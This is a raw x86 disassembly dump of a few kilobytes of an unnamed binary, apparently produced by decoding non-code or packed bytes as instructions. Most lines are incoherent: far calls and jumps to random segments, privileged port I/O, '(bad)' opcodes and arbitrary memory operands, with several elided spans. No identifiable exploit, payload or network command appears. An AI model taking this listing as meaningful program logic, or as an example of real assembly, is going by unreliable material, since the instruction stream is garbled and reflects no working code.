  4203a2:	std    
  4203a3:	imul   ecx,DWORD PTR [ecx+ebp*1-0x5055d2c2],0xffffffc1
  4203ab:	inc    esi
  4203ac:	pop    ebx
  4203ad:	ret    0x43d8
  4203b0:	xchg   BYTE PTR [eax+0x88fb442],bh
  4203b6:	jmp    0x420338
  4203b8:	out    0xb0,eax
  4203ba:	call   0xcf5c:0x8da9c1e5
  4203c1:	les    ecx,FWORD PTR [ebp-0x7b]
  4203c4:	push   ecx
  4203c5:	aad    0x60
  4203c7:	jle    0x420382
  4203c9:	push   edx
  4203ca:	das    
  4203cb:	sub    BYTE PTR [ebp-0x1eea68d7],cl
  4203d1:	cs ret 0xa66f
  4203d5:	iret   
  4203d6:	loop   0x42035a
  4203d8:	mov    al,0xf5
  4203da:	add    BYTE PTR [ebx-0x1b8827a2],dl
  4203e0:	push   esi
  4203e1:	adc    edi,DWORD PTR [edi]
  4203e3:	mov    dl,0x5d
  4203e5:	repz adc DWORD PTR [eax-0x5d],edx
  4203e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203ea:	or     al,0x89
  4203ec:	int    0xc6
  4203ee:	pop    ebx
  4203ef:	pslld  mm5,QWORD PTR [ecx+0x29d6d83e]
  4203f6:	inc    edi
  4203f7:	pop    ds
  4203f8:	adc    eax,0xfe164aa4
  4203fd:	lock mov esp,0x5a6d50cb
  420403:	imul   edx,DWORD PTR [ebp-0x2e],0x15
  420407:	aam    0x77
  420409:	adc    dh,BYTE PTR [edi+0x6c8eed33]
  42040f:	xchg   ebp,eax
  420410:	cwde   
  420411:	pop    ds
  420412:	sub    ebx,DWORD PTR [ebx-0x4292cbcd]
  420418:	push   es
  420419:	lea    ebx,[ebp+0x44d73126]
  42041f:	sahf   
  420420:	push   cs
  420421:	fbstp  TBYTE PTR [ebp-0x50eeefa6]
  420427:	das    
  420428:	mov    dh,0xcb
  42042a:	mov    dl,0x1f
  42042c:	mov    ebx,0x967a911c
  420431:	mov    ds:0x1f53ac,al
	...
  420496:	scas   al,BYTE PTR es:[edi]
  420497:	xchg   esp,eax
  420498:	push   edi
  420499:	adc    bh,BYTE PTR [edi-0x2d]
  42049c:	out    dx,eax
  42049d:	mov    esp,0xb41496f0
  4204a2:	outs   dx,BYTE PTR ds:[esi]
  4204a3:	ss stos WORD PTR es:[edi],ax
  4204a6:	mov    DWORD PTR [esi+0x1],edx
  4204a9:	add    BYTE PTR [edi],al
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    BYTE PTR [ecx-0x68],cl
  4204b0:	sti    
  4204b1:	daa    
  4204b2:	adc    esi,ebx
  4204b4:	mov    esp,0x783ee898
  4204b9:	mov    WORD PTR es:[ebx-0x36],cs
  4204bd:	or     BYTE PTR [edi],dl
  4204bf:	das    
  4204c0:	cwde   
  4204c1:	jno    0x420481
  4204c3:	call   0x932291b3
  4204c8:	cwde   
  4204c9:	shr    BYTE PTR [esi-0x6282419],1
  4204cf:	sub    eax,DWORD PTR [ecx-0x1371be46]
  4204d5:	in     al,dx
  4204d6:	mov    WORD PTR [ecx],es
  4204d8:	jno    0x4204f0
  4204da:	sub    BYTE PTR [esi-0x3b],ch
  4204dd:	cli    
  4204de:	push   ds
  4204df:	fsubr  DWORD PTR ds:0xbd033534
  4204e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204e6:	pop    edx
  4204e7:	cwde   
  4204e8:	jg     0x420489
  4204ea:	inc    ecx
  4204eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204ec:	call   0x9f59:0x349834b5
  4204f3:	aaa    
  4204f4:	stos   BYTE PTR es:[edi],al
  4204f5:	nop
  4204f6:	mov    eax,ds:0x8576dcfc
  4204fb:	arpl   sp,bp
  4204fd:	cld    
  4204fe:	mov    bh,dl
  420500:	adc    ah,BYTE PTR [ebp-0x7b]
  420503:	pop    ss
  420504:	call   0xd749:0x4ebfdce
  42050b:	adc    DWORD PTR [edi+0x7d],esi
  42050e:	pop    esp
  42050f:	or     DWORD PTR [ecx+eax*8],esp
  420512:	sub    ebp,DWORD PTR [esi-0x7f]
  420515:	jecxz  0x4204b9
  420517:	xchg   edx,eax
  420518:	scas   al,BYTE PTR es:[edi]
  420519:	jp     0x420536
  42051b:	dec    esi
  42051c:	xor    DWORD PTR [esi+0x1d57f0fc],ecx
  420522:	ret    0x28a
  420525:	lea    esi,[eax-0x7d]
  420528:	pop    ebp
  420529:	jae    0x42057a
  42052b:	fidiv  WORD PTR [esi+0x42]
  42052e:	es xor eax,0x27c3db33
  420534:	shl    BYTE PTR [eax+esi*2],0x90
  420538:	mov    edi,0x81fcaf68
  42053d:	int    0xfb
  42053f:	add    eax,0xbe9ceb39
  420544:	lock call 0xb050:0x6cd6cc38
  42054c:	cmp    dl,ah
  42054e:	inc    esi
  42054f:	jmp    FWORD PTR [edi-0x7]
  420552:	test   eax,0xedd6f4e
  420557:	and    DWORD PTR ds:0xf51397e2,edx
  42055d:	fwait
  42055e:	sbb    BYTE PTR [ebp-0x58],al
  420561:	dec    ebx
  420562:	jb     0x420528
  420564:	test   al,0x56
  420566:	cdq    
  420567:	sbb    al,0xec
  420569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42056a:	or     al,0x86
  42056c:	jge    0x420574
  42056e:	push   esi
  42056f:	outs   dx,DWORD PTR ds:[esi]
  420570:	mov    al,ds:0x5d8a1e62
  420575:	sar    BYTE PTR [esi-0x3c5609a3],0xb9
  42057c:	sar    BYTE PTR [ebp-0x4359874b],cl
  420582:	inc    edi
  420583:	lods   al,BYTE PTR ds:[esi]
  420584:	adc    ah,BYTE PTR [edi-0x6b]
  420587:	mov    edx,0x1341f409
  42058c:	in     al,0x7a
  42058e:	fiadd  DWORD PTR [esi+0x34]
  420591:	mov    eax,ds:0x865b9601
  420596:	pop    ebx
  420597:	sub    ah,BYTE PTR [ecx-0x5f]
  42059a:	dec    ecx
  42059b:	shl    DWORD PTR [ebx],0xcd
  42059e:	shr    DWORD PTR ds:0xd106347,cl
  4205a4:	push   esi
  4205a5:	and    dl,bh
  4205a7:	mov    esi,DWORD PTR [ecx]
  4205a9:	add    bh,bl
  4205ab:	test   al,0x37
  4205ad:	call   0x60c8:0xd2a16d73
  4205b4:	xlat   BYTE PTR ds:[ebx]
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0x6850d688
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [ebp+0x60],ah
  420630:	push   cs
  420631:	pop    ds
  420632:	pop    ebx
  420633:	pushf  
  420634:	loopne 0x420631
  420636:	xor    dh,BYTE PTR [ebp+eax*8-0x5e]
  42063a:	loopne 0x4205f5
  42063c:	add    BYTE PTR [ebp+0x60c05dac],bh
  420642:	jmp    0x8dc0:0x482a0d8f
  420649:	sbb    ecx,DWORD PTR [ebx-0x6]
  42064c:	test   al,0xcf
  42064e:	mov    dl,0xb6
  420650:	adc    edi,DWORD PTR [edx]
  420652:	int    0xe5
  420654:	jl     0x42061b
  420656:	(bad)  
  420657:	fisubr DWORD PTR [bx+di-0x42b5]
  42065c:	daa    
  42065d:	int3   
  42065e:	mov    eax,0x8db035e6
  420663:	xor    BYTE PTR [ebx-0x40b5f9ca],dh
  420669:	cwde   
  42066a:	shl    DWORD PTR [ecx-0x64],cl
  42066d:	call   0x3729:0x71d7c61a
  420674:	lock ja 0x420611
  420677:	mul    BYTE PTR ds:0xd882d39c
  42067d:	inc    esi
  42067e:	sar    BYTE PTR [eax],1
  420680:	test   eax,0x2291fe3b
  420685:	add    cl,BYTE PTR [edi-0x501a7c96]
  42068b:	cmp    eax,0x1c9023e0
  420690:	nop
  420691:	pop    ebx
  420692:	in     al,0xbf
  420694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420695:	sub    bh,BYTE PTR [eax-0x1c]
  420698:	outs   dx,BYTE PTR ds:[esi]
  420699:	or     al,0x9
  42069b:	xlat   BYTE PTR ds:[ebx]
  42069c:	out    0xc5,eax
  42069e:	cmp    eax,0xdaa73ec5
  4206a3:	xor    esi,DWORD PTR ss:[eax-0x10]
  4206a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206a8:	jae    0x42071a
  4206aa:	out    0xdf,eax
  4206ac:	rep ins BYTE PTR es:[edi],dx
  4206ae:	retf   0x375a
  4206b1:	ret    
  4206b2:	add    DWORD PTR [ebx+0x5b],ebp
  4206b5:	dec    ebp
  4206b6:	dec    esi
  4206b7:	jl     0x42072d
  4206b9:	test   eax,0xb4b8f6d0
  4206be:	in     eax,0xcf
  4206c0:	and    BYTE PTR [eax],0x13
  4206c3:	fsubr  QWORD PTR [edi-0x36]
  4206c6:	int3   
  4206c7:	adc    dl,ah
  4206c9:	cdq    
  4206ca:	and    al,0x52
  4206cc:	ins    DWORD PTR es:[edi],dx
  4206cd:	setg   BYTE PTR [edx+0x44]
  4206d1:	sbb    BYTE PTR [ecx+0x5],ah
  4206d4:	push   0x18
  4206d6:	mov    cl,0x2d
  4206d8:	imul   eax,ebp,0x6b
  4206db:	mov    edx,0x89907d2f
  4206e0:	push   0x3d
  4206e2:	mov    ds:0x48f8853a,eax
  4206e7:	mov    bl,BYTE PTR [edi+0x61]
  4206ea:	data16 adc al,0x86
  4206ed:	stos   DWORD PTR es:[edi],eax
  4206ee:	outs   dx,BYTE PTR ds:[esi]
  4206ef:	(bad)  
  4206f0:	sbb    BYTE PTR [ebx],dh
  4206f2:	pop    esp
  4206f3:	in     al,dx
  4206f4:	(bad)  
  4206f5:	adc    al,0x61
  4206f7:	imul   esi,DWORD PTR [edx+esi*2-0x76],0x40b403d5
  4206ff:	push   ecx
  420700:	mov    al,0x58
  420702:	mov    bl,0xe
  420704:	mov    ebx,0x5880c863
  420709:	ja     0x420771
  42070b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42070c:	mov    BYTE PTR [edx+0x759d075],cl
  420712:	pop    eax
  420713:	inc    esp
  420714:	std    
  420715:	rol    DWORD PTR [esi-0x2ad0212d],cl
  42071b:	je     0x4206c1
  42071d:	out    0x37,eax
  42071f:	add    DWORD PTR [ecx+ebx*1-0x73a3c024],eax
  420726:	inc    esp
  420727:	enter  0xcc93,0x42
  42072b:	cmp    ch,BYTE PTR [ecx-0x6d]
  42072e:	test   edi,eax
  420730:	xor    BYTE PTR [ebx+0xfbc356],ch
	...
  420796:	mov    DWORD PTR [edi],ebp
  420798:	and    eax,0xad8aa780
  42079d:	das    
  42079e:	jmp    0x7f6da37a
  4207a3:	pop    edx
  4207a4:	lods   al,BYTE PTR ds:[esi]
  4207a5:	pop    ecx
  4207a6:	xchg   edi,eax
  4207a7:	pop    eax
  4207a8:	add    DWORD PTR [eax],eax
  4207aa:	pop    es
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    dh,al
  4207af:	and    eax,0x5946830
  4207b4:	cld    
  4207b5:	adc    DWORD PTR [eax+ebx*4],edx
  4207b8:	cli    
  4207b9:	jmp    0x42078c
  4207bb:	pop    es
  4207bc:	xor    eax,0x7b3f1c70
  4207c1:	icebp  
  4207c2:	xor    al,0x70
  4207c4:	out    0x7e,al
  4207c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c7:	sub    al,0x5c
  4207c9:	sbb    BYTE PTR [esi],ah
  4207cb:	fcmove st,st(4)
  4207cd:	inc    esp
  4207ce:	jae    0x420792
  4207d0:	fild   QWORD PTR [ebp-0x3b]
  4207d3:	and    eax,0x9d41a1dd
  4207d8:	lahf   
  4207d9:	push   0xffffffa8
  4207db:	xchg   BYTE PTR [ecx+0x4ec55eb2],cl
  4207e1:	pop    ecx
  4207e2:	jns    0x420786
  4207e4:	popa   
  4207e5:	arpl   WORD PTR [ecx+0x2f],sp
  4207e8:	pushf  
  4207e9:	jmp    0x8c401a97
  4207ee:	mov    cl,0x97
  4207f0:	and    ebp,DWORD PTR [edx-0x2869bc3b]
  4207f6:	test   DWORD PTR [edx-0x82170e2],ebp
  4207fc:	lea    ebx,[esi-0x60dd4b34]
  420802:	rcl    DWORD PTR [edx+0x79],0xa0
  420806:	jnp    0x42085c
  420808:	ficomp DWORD PTR [edx]
  42080a:	fidivr WORD PTR [edx+0x8]
  42080d:	dec    esi
  42080e:	mov    ebp,0xa041f7ae
  420813:	dec    ecx
  420814:	call   0x95c25af7
  420819:	faddp  st(7),st
  42081b:	xchg   esp,eax
  42081c:	push   es
  42081d:	add    al,0xa0
  42081f:	jo     0x420821
  420821:	sbb    eax,DWORD PTR [ecx+0x18]
  420824:	out    0x90,al
  420826:	leave  
  420827:	fidiv  WORD PTR [esi-0x2c]
  42082a:	inc    ebx
  42082b:	shr    DWORD PTR [ebx+0x7ecc9598],0x4d
  420832:	adc    al,0x6c
  420834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420835:	clc    
  420836:	cmp    DWORD PTR [esi-0x6],ebp
  420839:	pop    esi
  42083a:	popa   
  42083b:	retf   
  42083c:	bound  ebp,QWORD PTR [ebp-0x3]
  42083f:	jne    0x420816
  420841:	or     dh,BYTE PTR [ebx+0x7e]
  420844:	push   eax
  420845:	add    ah,BYTE PTR [ebp+edx*8-0x52]
  420849:	pushf  
  42084a:	xlat   BYTE PTR ds:[ebx]
  42084b:	outs   dx,BYTE PTR ds:[esi]
  42084c:	jno    0x4208bb
  42084e:	sti    
  42084f:	mov    bh,0x6a
  420851:	xchg   edi,eax
  420852:	xor    edx,DWORD PTR [ebx*2+0x47b4b8e4]
  420859:	fstp   DWORD PTR [eax+ebp*2]
  42085c:	pop    edx
  42085d:	dec    esp
  42085e:	cmp    DWORD PTR [ebx+0x45c15df],esp
  420864:	pop    ss
  420865:	test   ebp,0x8da9ca51
  42086b:	ret    0x56fe
  42086e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42086f:	sbb    DWORD PTR [edi-0x54],esi
  420872:	into   
  420873:	aas    
  420874:	adc    eax,0x75b358ed
  420879:	ret    
  42087a:	mov    esp,0xcee0c8bd
  42087f:	pop    ds
  420880:	cld    
  420881:	js     0x420822
  420883:	xlat   BYTE PTR ds:[ebx]
  420884:	mov    ecx,0x2b99fdf5
  420889:	jae    0x420848
  42088b:	mov    esi,0x984c14
  420890:	lock stos BYTE PTR es:[edi],al
  420892:	inc    ebx
  420893:	xor    ah,BYTE PTR [edx+0x49]
  420896:	xchg   eax,ebx
  420898:	xlat   BYTE PTR ds:[ebx]
  420899:	xchg   esp,eax
  42089a:	push   0x52ebc10d
  42089f:	dec    ecx
  4208a0:	and    edi,DWORD PTR [edx-0x60440713]
  4208a6:	push   0x5a
  4208a8:	push   0x1e
  4208aa:	mov    ebp,0x8e90f830
  4208af:	inc    DWORD PTR [edx-0x3d6bc1b8]
	...
  420915:	add    ah,bl
  420917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420918:	jae    0x420967
  42091a:	jnp    0x4208fb
  42091c:	(bad)  
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0x70ae
  420924:	loope  0x420905
  420926:	sahf   
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR [ecx+0x722fff1d],cl
  420933:	repnz loope 0x420978
  420936:	(bad)  
  420937:	aad    0x26
  420939:	test   BYTE PTR [edi],dl
  42093b:	pop    ebp
  42093c:	in     eax,dx
  42093d:	cmp    eax,0x64235556
  420942:	dec    BYTE PTR [ebx+ebx*8]
  420945:	dec    esp
  420946:	and    dl,BYTE PTR [edi-0x727adb6b]
  42094c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42094d:	mov    DWORD PTR [ebp+0x7021f5c1],ebx
  420953:	fst    QWORD PTR [eax-0x22]
  420956:	or     eax,0xad18a414
  42095b:	and    eax,0x38e6e14
  420960:	cdq    
  420961:	sbb    eax,0x6d24a109
  420966:	into   
  420967:	mov    ecx,0x6c858a91
  42096c:	outs   dx,DWORD PTR ds:[esi]
  42096d:	mov    bh,0xc
  42096f:	pop    edi
  420970:	fcomp  QWORD PTR [esp+ecx*2-0x16]
  420974:	dec    edx
  420975:	outs   dx,DWORD PTR ds:[esi]
  420976:	fild   DWORD PTR [ecx-0x5c]
  420979:	into   
  42097a:	rcr    eax,cl
  42097c:	xor    esi,DWORD PTR [esi]
  42097e:	xor    ch,bl
  420980:	into   
  420981:	clc    
  420982:	stos   BYTE PTR es:[edi],al
  420983:	mov    eax,0x2a969d96
  420988:	dec    eax
  420989:	imul   esi,DWORD PTR [ebx+0x72b4c7f9],0x9dd4351d
  420993:	je     0x4209d2
  420995:	mov    esi,0x8aa29d3e
  42099a:	cli    
  42099b:	sbb    DWORD PTR [ecx],0xb115243c
  4209a1:	icebp  
  4209a2:	mov    ebp,edx
  4209a4:	cmp    ah,dl
  4209a6:	xor    eax,0x9196915b
  4209ab:	sbb    cl,BYTE PTR [edx+0x7e]
  4209ae:	cmp    cl,BYTE PTR [edi+0x727930cf]
  4209b4:	repz out dx,al
  4209b6:	aad    0xee
  4209b8:	retf   0x8e54
  4209bb:	mov    es,WORD PTR [ecx-0x25]
  4209be:	stos   DWORD PTR es:[edi],eax
  4209bf:	mov    al,ds:0x7c4b5cd4
  4209c4:	cwde   
  4209c5:	lods   eax,DWORD PTR ds:[esi]
  4209c6:	push   esi
  4209c7:	out    dx,eax
  4209c8:	nop
  4209c9:	sub    eax,0x439c1670
  4209ce:	inc    edi
  4209cf:	aas    
  4209d0:	pop    DWORD PTR [edi-0x64d8e366]
  4209d6:	add    ebp,0xffffffb7
  4209d9:	js     0x420a15
  4209db:	or     BYTE PTR [ebx-0x138b8e39],dl
  4209e1:	iret   
  4209e2:	pop    edx
  4209e3:	push   edi
  4209e4:	stos   BYTE PTR es:[edi],al
  4209e5:	int3   
  4209e6:	adc    BYTE PTR [ecx+ebx*1-0x45e0a35b],ch
  4209ed:	xor    eax,0xada08ac3
  4209f2:	jo     0x4209f8
  4209f4:	scas   al,BYTE PTR es:[edi]
  4209f5:	repz cmp eax,0xd2fee453
  4209fb:	sbb    DWORD PTR [edi+esi*1+0x463d7717],ebp
  420a02:	pop    bx
  420a04:	xchg   ebp,eax
  420a05:	add    al,0x12
  420a07:	mov    eax,0x8077a1dd
  420a0c:	cmp    DWORD PTR [eax-0x5a],ebp
  420a0f:	push   ecx
  420a10:	and    al,bl
  420a12:	xor    al,0xe
  420a14:	ja     0x420a83
  420a16:	(bad)  
  420a17:	cmp    esi,eax
  420a19:	dec    edi
  420a1a:	cmc    
  420a1b:	pop    ss
  420a1c:	(bad)  ss:[edi-0xcde02e]
  420a23:	das    
  420a24:	(bad)  
  420a25:	jmp    0x8ca7:0x73380cbe
  420a2c:	push   ds
  420a2d:	sub    al,0x80
  420a2f:	or     edi,edx
  420a31:	sar    DWORD PTR [edi],cl
  420a33:	dec    esp
  420a34:	call   0x0:0x0
	...
  420a93:	add    BYTE PTR [eax],al
  420a95:	add    bh,bl
  420a97:	xor    ch,BYTE PTR [edi-0x6010ed]
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   BYTE PTR [esi-0x15],al
  420aa4:	shl    al,cl
  420aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aa7:	pop    edx
  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    bl,bh
  420aaf:	test   DWORD PTR [ecx-0x60],eax
  420ab2:	and    BYTE PTR [ecx+0x5f376b42],cl
  420ab8:	pop    esp
  420ab9:	sub    ebp,DWORD PTR [edx+0x76]
  420abc:	leave  
  420abd:	cmp    ebp,edx
  420abf:	scas   eax,DWORD PTR es:[edi]
  420ac0:	imul   ebp,DWORD PTR [ebx+0x26],0x4
  420ac4:	jmp    0x3578:0x631be415
  420acb:	jl     0x875b2e9d
  420ad1:	mov    ecx,0x372d0870
  420ad6:	lds    edi,FWORD PTR [eax-0x7ba4d5d8]
  420adc:	and    al,0x4b
  420ade:	gs dec ebx
  420ae0:	push   eax
  420ae1:	pop    esi
  420ae2:	mov    ebx,0xd71969bb
  420ae7:	add    BYTE PTR [ebp+0x1795f4c1],al
  420aed:	cmp    ecx,DWORD PTR [ebx]
  420aef:	xchg   BYTE PTR [ebx+ecx*8],bh
  420af2:	in     eax,0x59
  420af4:	mov    BYTE PTR [eax-0x3],bh
  420af7:	loope  0x420af5
  420af9:	dec    ebx
  420afa:	clc    
  420afb:	mov    edi,0xc4dc0f80
  420b00:	outs   dx,DWORD PTR ds:[esi]
  420b01:	int    0x72
  420b03:	add    eax,0xf833ac47
  420b08:	xlat   BYTE PTR ds:[ebx]
  420b09:	in     al,0x1c
  420b0b:	inc    esp
  420b0c:	inc    ebp
  420b0d:	imul   ecx,DWORD PTR [ecx-0x17d78363],0xffffffeb
  420b14:	sub    ch,BYTE PTR [ebx-0x73]
  420b17:	fist   WORD PTR [esi+ebp*1]
  420b1a:	ins    BYTE PTR es:[edi],dx
  420b1b:	and    BYTE PTR [ecx],0xf6
  420b1e:	jno    0x420b0f
  420b20:	sbb    ebx,DWORD PTR [ecx+0x43838d1e]
  420b26:	mov    eax,ds:0xc566da6f
  420b2b:	sub    BYTE PTR [edi-0x127a2dd6],al
  420b31:	(bad)  
  420b33:	jmp    0x400:0x221855c6
  420b3a:	les    ebx,FWORD PTR cs:[ebp+0x47]
  420b3e:	sti    
  420b3f:	mov    dl,0x97
  420b41:	iret   
  420b42:	call   0x1e5:0x1f3808aa
  420b49:	(bad)  
  420b4a:	adc    bl,BYTE PTR [ecx-0x6d8f8829]
  420b50:	mov    esi,edx
  420b52:	pop    esi
  420b53:	mov    esp,0xcd359296
  420b58:	ins    DWORD PTR es:[edi],dx
  420b59:	aad    0xe8
  420b5b:	push   DWORD PTR [ebp-0x21]
  420b5e:	xchg   ah,dl
  420b60:	aas    
  420b61:	or     esi,DWORD PTR [eax+0x510ed0ee]
  420b67:	push   cs
  420b68:	sub    DWORD PTR [ebx-0x80],esp
  420b6b:	push   edi
  420b6c:	aam    0x38
  420b6e:	inc    edi
  420b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b70:	mov    cl,0xdb
  420b72:	mov    esp,0x7ec93d34
  420b77:	bound  edx,QWORD PTR ds:0x9da5c21
  420b7d:	std    
  420b7e:	outs   dx,BYTE PTR ds:[esi]
  420b7f:	push   ecx
  420b80:	addr16 jb 0x420b26
  420b83:	adc    DWORD PTR [edx+ecx*2],ebx
  420b86:	inc    ebx
  420b87:	xchg   edi,eax
  420b88:	jg     0x420bef
  420b8a:	add    eax,0x53a4c15
  420b8f:	fwait
  420b90:	sub    ebp,DWORD PTR [edx+0x381121ca]
  420b96:	das    
  420b97:	dec    edi
  420b98:	lods   al,BYTE PTR ds:[esi]
  420b99:	aad    0x52
  420b9b:	pusha  
  420b9c:	push   ss
  420b9d:	add    ebx,DWORD PTR [eax]
  420b9f:	hlt    
  420ba0:	mov    dl,0xbf
  420ba2:	xchg   ebx,eax
  420ba3:	adc    BYTE PTR [eax],bl
  420ba5:	dec    edx
  420ba6:	lods   al,BYTE PTR ds:[esi]
  420ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba8:	inc    edi
  420ba9:	clc    
  420baa:	adc    BYTE PTR [esi+0xa34260d],cl
  420bb0:	in     al,0xc4
  420bb2:	inc    eax
  420bb3:	(bad)  
  420bb4:	pop    edi
	...
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	xchg   ecx,eax
  420c23:	into   
  420c24:	push   edx
  420c25:	stos   BYTE PTR es:[edi],al
  420c26:	lods   al,BYTE PTR ds:[esi]
  420c27:	pop    ebx
  420c28:	add    DWORD PTR [eax],eax
  420c2a:	pop    es
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [ebx],cl
  420c2f:	arpl   WORD PTR [ebp-0x64],di
  420c32:	adc    BYTE PTR [ecx-0x13c19837],al
  420c38:	imul   edi,DWORD PTR [eax],0x4d
  420c3b:	jp     0x420c47
  420c3d:	ins    BYTE PTR es:[edi],dx
  420c3e:	test   ebx,edx
  420c40:	adc    DWORD PTR ds:0xa1f24184,edx
  420c46:	icebp  
  420c47:	fcmovnu st,st(5)
  420c49:	imul   edx,DWORD PTR [esi-0x63],0x4a
  420c4d:	ret    0x5f4b
  420c50:	push   eax
  420c51:	mov    edx,0x444da83a
  420c56:	daa    
  420c57:	xor    eax,0x9a7a9481
  420c5c:	lds    edx,FWORD PTR [ebp-0x5a]
  420c5f:	adc    dl,BYTE PTR [ebp+ebx*1-0x7da797af]
  420c66:	ret    
  420c67:	aas    
  420c68:	call   0xd21e60cb
  420c6d:	in     al,0x7e
  420c6f:	pop    ebx
  420c70:	xor    DWORD PTR [edx-0x61],edi
  420c73:	mov    WORD PTR [ecx+0x54],ds
  420c76:	sub    DWORD PTR [ecx+eax*1-0xc4b4e26],edx
  420c7d:	xchg   esi,eax
  420c7e:	xchg   esp,eax
  420c7f:	enter  0x78ef,0x4f
  420c83:	into   
  420c84:	pop    es
  420c85:	mov    eax,DWORD PTR [ebp-0x2b]
  420c88:	push   edx
  420c89:	sbb    esi,DWORD PTR [esp+eiz*2+0x30196b98]
  420c90:	xchg   esp,eax
  420c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c92:	xor    ah,0x8b
  420c95:	or     eax,0xebf713f7
  420c9a:	mov    al,ds:0xc8157443
  420c9f:	popf   
  420ca0:	addr16 clc 
  420ca2:	fisubr WORD PTR [ebp+0xf]
  420ca5:	sti    
  420ca6:	dec    edx
  420ca7:	sbb    cl,BYTE PTR [esi+0x66fb8cf0]
  420cad:	and    al,0x40
  420caf:	jp     0x420c45
  420cb1:	pop    esi
  420cb2:	pop    ebx
  420cb3:	lock lea ebp,cs:[ebx-0xc]
  420cb8:	mov    ebp,0x2b9eafd1
  420cbd:	push   edi
  420cbe:	xchg   ebp,eax
  420cbf:	inc    ecx
  420cc0:	inc    ebp
  420cc1:	in     al,0x46
  420cc3:	icebp  
  420cc4:	outs   dx,BYTE PTR ds:[esi]
  420cc5:	xor    eax,DWORD PTR [ebp-0x6e]
  420cc8:	or     eax,0xe39b931
  420ccd:	push   ebx
  420cce:	sbb    DWORD PTR [esi],0x50a4cfd9
  420cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cd5:	mov    esi,0x59af148e
  420cda:	push   edx
  420cdb:	addr16 inc edi
  420cdd:	shr    BYTE PTR [eax],1
  420cdf:	stc    
  420ce0:	mov    esp,edx
  420ce2:	jecxz  0x420caa
  420ce4:	shr    dl,1
  420ce6:	xchg   ecx,eax
  420ce7:	or     eax,DWORD PTR [eax-0x799bada8]
  420ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cee:	mov    ch,0xdb
  420cf0:	jle    0x420cf2
  420cf2:	lahf   
  420cf3:	in     eax,dx
  420cf4:	pop    ebp
  420cf5:	add    esp,DWORD PTR [ecx+ebx*2]
  420cf8:	pop    esp
  420cf9:	loopne 0x420c88
  420cfb:	mov    bh,ah
  420cfd:	and    eax,0xd9ea7122
  420d02:	sbb    dl,BYTE PTR [ebx+0x3]
  420d05:	pop    edi
  420d06:	xor    al,0xd2
  420d08:	call   0xe5d140d3
  420d0d:	push   0x31
  420d0f:	mov    dh,0xa4
  420d11:	jmp    0x420d21
  420d13:	mov    edx,DWORD PTR [esi]
  420d15:	fidiv  DWORD PTR [ecx-0x4101bbc4]
  420d1b:	aas    
  420d1c:	ins    DWORD PTR es:[edi],dx
  420d1d:	push   ebp
  420d1e:	loop   0x420d0b
  420d20:	xchg   DWORD PTR [esi],ebx
  420d22:	cwde   
  420d23:	jns    0x420cdd
  420d25:	cmp    esp,ebx
  420d27:	xor    al,0x3
  420d29:	push   DWORD PTR [ebp+0x652f74e6]
  420d2f:	adc    eax,0x3366445c
  420d34:	mov    BYTE PTR [eax],0x0
	...
  420d93:	add    BYTE PTR [eax],al
  420d95:	add    bh,ah
  420d97:	push   ds
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x920c1cea
  420da3:	popa   
  420da4:	inc    ebp
  420da5:	xchg   edx,eax
  420da6:	mov    bl,0x5c
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR [ebx],cl
  420daf:	mov    bl,0xa8
  420db1:	cmp    dl,dh
  420db3:	and    esi,eax
  420db5:	popa   
  420db6:	xchg   esi,eax
  420db7:	sar    BYTE PTR [edx-0x6a],0xce
  420dbb:	jae    0x420d8c
  420dbd:	mov    DWORD PTR [edi],edi
  420dbf:	mov    edi,0xf2188f86
  420dc4:	adc    al,dh
  420dc6:	call   0x8792849c
  420dcb:	add    BYTE PTR [edx-0x7e],al
  420dce:	or     ebx,ebp
  420dd0:	sahf   
  420dd1:	stos   BYTE PTR es:[edi],al
  420dd2:	fbld   TBYTE PTR [eax]
  420dd4:	mov    DWORD PTR [ebx],eax
  420dd6:	ds sub ebp,eax
  420dd9:	lods   eax,DWORD PTR ds:[esi]
  420dda:	or     dh,BYTE PTR [ecx-0x29cf9be8]
  420de0:	mov    cl,0x5b
  420de2:	test   DWORD PTR [edx+0x6f0841d4],esi
